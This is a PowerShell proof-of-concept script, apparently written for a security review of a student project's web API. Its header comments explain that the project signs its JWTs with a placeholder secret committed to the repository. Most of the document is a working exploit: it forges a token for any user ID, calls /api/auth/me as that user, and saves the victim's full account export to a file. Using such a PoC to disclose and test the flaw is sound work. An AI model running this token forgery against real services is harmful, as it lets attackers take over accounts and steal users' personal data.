# PoC #1 — JWT forgery / full account takeover of ANY user
#
# Root cause: the HS256 signing secret is a committed placeholder
#   server/appsettings.json -> Jwt:Key = "CHANGE_ME_TO_A_LONG_RANDOM_SECRET_IN_PRODUCTION"
#   server/Services/JwtService.cs:21  (signs with that key)
#   server/Program.cs:49              (validates with that key)
# Anyone who reads the repo (public diploma repo) knows the secret and can mint a
# valid token for an arbitrary "sub" (userId) claim. There is no token revocation and
# tokens live 90 days (JwtService.cs:34).
#
# This script forges a token for sub=1 and calls an authenticated endpoint as that user.
#
# EXECUTION STATUS: NOT executed here (no running server/DB). The crypto is self-contained
# and will produce a token the server accepts as long as Jwt:Key/Issuer/Audience match
# appsettings.json. Run against a live instance to confirm 200 on /api/auth/me.

param(
  [string]$BaseUrl   = "http://localhost:5080",
  [int]   $TargetSub = 1,
  [string]$Email     = "victim@gmail.com",
  [string]$Key       = "CHANGE_ME_TO_A_LONG_RANDOM_SECRET_IN_PRODUCTION",
  [string]$Issuer    = "planner-api",
  [string]$Audience  = "planner-client"
)

function B64Url([byte[]]$bytes) {
  [Convert]::ToBase64String($bytes).TrimEnd('=').Replace('+','-').Replace('/','_')
}

$now = [DateTimeOffset]::UtcNow
$exp = $now.AddDays(90).ToUnixTimeSeconds()

$header  = '{"alg":"HS256","typ":"JWT"}'
# Claim names match JwtService: "sub" and "email" (JwtRegisteredClaimNames)
$payload = "{""sub"":""$TargetSub"",""email"":""$Email"",""iss"":""$Issuer"",""aud"":""$Audience"",""exp"":$exp}"

$h = B64Url([Text.Encoding]::UTF8.GetBytes($header))
$p = B64Url([Text.Encoding]::UTF8.GetBytes($payload))
$signingInput = "$h.$p"

$hmac = [System.Security.Cryptography.HMACSHA256]::new([Text.Encoding]::UTF8.GetBytes($Key))
$sig  = B64Url($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($signingInput)))

$token = "$signingInput.$sig"
Write-Host "Forged token for userId=$TargetSub :`n$token`n"

Write-Host "Calling $BaseUrl/api/auth/me as the forged user ..."
try {
  $me = Invoke-RestMethod -Uri "$BaseUrl/api/auth/me" -Headers @{ Authorization = "Bearer $token" }
  Write-Host "VULNERABLE: server accepted forged token. Identity returned:"
  $me | ConvertTo-Json
  Write-Host "`nNow dumping the victim's entire account via /api/account/export ..."
  Invoke-WebRequest -Uri "$BaseUrl/api/account/export" -Headers @{ Authorization = "Bearer $token" } -OutFile "stolen-export.json"
  Write-Host "Saved victim data to stolen-export.json"
} catch {
  Write-Host "Request failed (server down?): $($_.Exception.Message)"
}
